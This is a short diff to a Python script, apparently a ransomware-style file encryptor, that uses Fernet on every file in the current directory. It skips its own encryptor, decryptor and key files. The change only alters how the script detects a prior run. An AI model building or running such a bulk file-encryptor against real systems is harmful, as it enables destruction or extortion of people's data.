@@ -8,10 +8,12 @@ from cryptography.fernet import Fernet
 files = []
 save_path = './keys'
 
-if len(os.listdir(save_path)) != 0:
+if os.path.isdir(save_path):
     print("Files are already encrypted!")
 
 else:
+    os.mkdir(save_path)
+
     for file in os.listdir():
         if file == "encryptor.py" or file == "key.key" or file == "decryptor.py" or file == "pkey.key" or file == "password.key":
             continue
